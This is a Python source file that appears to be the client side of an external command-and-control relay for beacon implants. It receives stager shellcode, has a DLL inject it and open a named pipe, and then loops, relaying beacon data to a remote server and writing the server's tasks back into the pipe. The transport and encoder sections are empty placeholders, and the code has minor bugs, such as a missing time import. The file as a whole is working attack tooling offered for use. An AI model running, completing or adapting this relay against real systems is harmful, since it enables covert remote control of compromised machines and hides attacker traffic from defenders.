from ctypes import *
from ctypes.wintypes import *
from sys import exit
from time import sleep

# <encoder imports>

# </encoder imports>


# <transport imports>

# </transport imports>


# <configurations>

# </configurations>


# <encoder functions>

# </encoder functions>


# <transport functions>

# </transport functions>

# Client core
C2_BLOCK_TIME = 1.5 # TODO, make me reconfigurable
CDLL_NAME = 'c2file.dll' # TODO, make me reconfigurable

maxlen = 1024*1024
lib = CDLL(CDLL_NAME)

lib.start_beacon.argtypes = [c_char_p,c_int]
lib.start_beacon.restype = POINTER(HANDLE)
def start_beacon(payload):
	return(lib.start_beacon(payload,len(payload)))  

lib.read_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.read_frame.restype = c_int
def ReadPipe(hPipe):
	mem = create_string_buffer(maxlen)
	l = lib.read_frame(hPipe,mem,maxlen)
	if l < 0: return(-1)
	chunk=mem.raw[:l]
	return(chunk)  

lib.write_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.write_frame.restype = c_int
def WritePipe(hPipe,chunk):
	print "wp: %s\n" % len(chunk)
	# print chunk # DEBUG
	ret = lib.write_frame(hPipe,c_char_p(chunk),c_int(len(chunk)))
	time.sleep(3) 
	print "ret=%s"%ret
	return(ret)

def go():
	print "Waiting for stager..." # DEBUG
	p = recvData()
	print "Got a stager! loading..."
	
	# Wait a few seconds to give the stager a chance to load
	sleep(2)

	# Send the stager shellcode to the dll for injection and pipe creation
	handle_beacon = start_beacon(p)

	# Grabbing and relaying the metadata from the SMB pipe is done during interact()
	print "Loaded, and got handle to beacon. Getting METADATA."

	return handle_beacon

def interact(handle_beacon):
	while(True):
		
		# LOGIC TO CHECK FOR A CHUNK FROM THE BEACON
		chunk = ReadPipe(handle_beacon)
		if chunk < 0:
			print 'readpipe %d' % (len(chunk))
			break
		else:
			print "Received %d bytes from pipe" % (len(chunk))
		print "relaying chunk to server"
		sendData(chunk)

		# LOGIC TO CHECK FOR A NEW TASK
		print "Checking for new tasks from transport"
		
		newTask = recvData()

		print "Got new task: %s" % (newTask)
		print "Writing %s bytes to pipe" % (len(newTask))
		r = WritePipe(handle_beacon, newTask)
		print "Write %s bytes to pipe" % (r)
		sleep(C2_BLOCK_TIME/100) # python sleep is in seconds, C2_BLOCK_TIME in milliseconds

# Prepare the transport module
prepTransport()

#Get and inject the stager
handle_beacon = go()

# Run the main loop, keyboard escape available for debugging
try:
	interact(handle_beacon)
except KeyboardInterrupt:
	print "Caught escape signal"
	exit(0)
